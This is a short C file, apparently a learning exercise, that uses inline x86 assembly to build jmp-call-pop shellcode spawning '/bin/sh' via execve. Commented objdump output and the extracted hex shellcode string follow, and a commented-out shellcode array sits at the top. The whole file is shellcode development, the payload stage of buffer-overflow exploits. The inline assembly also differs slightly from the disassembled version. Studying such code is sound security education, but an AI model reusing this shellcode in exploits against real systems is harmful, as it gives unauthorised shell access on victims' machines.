#include <stdio.h>

// char shellcode[] =  "\x55\x89\xe5\x53\x83\xec\x14\xe8\x54\x00\x00\x00\x05\x7e\x2e\x00\x00\x8d\x90\x08\xe0\xff\xff\x89\x55\xf4\x8b\x55\xf4\x89\x55\xec\xc7\x45\xf0\x00\x00\x00\x00\x8b\x55\xec\x83\xec\x04\x6a\x00\x8d\x4d\xec\x51\x52\x89\xc3\xe8\x9f\xfe\xff\xff\x83\xc4\x10\x90\x8b\x5d\xfc\xc9\xc3";


void foo(){
   asm(
     "jmp line\n\t"
    "address: popl %esi\n\t"
    "movl %esi, 0x8(%esi)\n\t"
    "xorl %eax, %eax\n\t"
    "movl %eax, 0xc(%esi)\n\t"
    "movb $0xb, %al\n\t"
    "movl %esi, %ebx\n\t"
    "leal 0x8(%esi), %ecx\n\t"
    "leal 0xc(%esi), %edx\n\t"
    "int $0x80\n\t"
    
    "xorl %ebx, %ebx\n\t"
    "movl %ebx, %eax\n\t"
    "inc %eax\n\t"
    "int $0x80\n\t"

    "line: call address\n\t"
    ".string \"/bin/sh\"\n\t"
   );
}

int main (){
foo () ;
return 0;
}
 


//  # 00000000 <_start>:
// #    0:   eb 18                   jmp    1a <line>

// # 00000002 <address>:
// #    2:   5e                      pop    %esi
// #    3:   31 c0                   xor    %eax,%eax
// #    5:   88 46 09                mov    %al,0x9(%esi)
// #    8:   89 76 0a                mov    %esi,0xa(%esi)
// #    b:   89 46 0e                mov    %eax,0xe(%esi)
// #    e:   b0 0b                   mov    $0xb,%al
// #   10:   89 f3                   mov    %esi,%ebx
// #   12:   8d 4e 08                lea    0x8(%esi),%ecx
// #   15:   8d 56 0c                lea    0xc(%esi),%edx
// #   18:   cd 80                   int    $0x80

// # 0000001a <line>:
// #   1a:   e8 e3 ff ff ff          call   2 <address>

// # 0000001f <variable>:
// #   1f:   2f                      das
// #   20:   62 69 6e                bound  %ebp,0x6e(%ecx)
// #   23:   2f                      das
// #   24:   62 61 73                bound  %esp,0x73(%ecx)
// #   27:   68 41 42 42 42          push   $0x42424241
// #   2c:   42                      inc    %edx
// #   2d:   43                      inc    %ebx
// #   2e:   43                      inc    %ebx
// #   2f:   43                      inc    %ebx
// #   30:   43                      inc    %ebx

// \xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43\x43